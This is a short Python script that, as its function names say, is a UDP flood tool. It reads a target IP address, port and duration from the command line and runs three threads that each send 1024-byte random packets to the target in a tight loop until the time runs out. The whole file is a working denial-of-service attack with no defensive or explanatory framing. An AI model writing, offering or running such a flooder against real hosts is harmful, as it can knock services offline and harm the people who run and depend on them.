import socket
import random
import sys
import datetime
import threading

def packet_send() :
  sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket

  start = datetime.datetime.now()
  sent = 0

  ip = sys.argv[1]
  port = sys.argv[2]
  duration = sys.argv[3]

  while 1: #Infinitely loops sending packets to the port until the program is exited.
      timeElapsed = datetime.datetime.now() - start
      if(timeElapsed.total_seconds() > int(duration)) :
        break;
      bytes=random._urandom(1024) #Creates packet
      sock.sendto(bytes,(ip,int(port)))
      sent += 1

def UDP_flood() :
  t1 = threading.Thread(target=packet_send)
  t2 = threading.Thread(target=packet_send)
  t3 = threading.Thread(target=packet_send)
  #t4 = threading.Thread(target=packet_send)

  t1.start()
  t2.start()
  t3.start()
  #t4.start()

  t1.join()
  t2.join()
  t3.join()
  #t4.join()

UDP_flood()
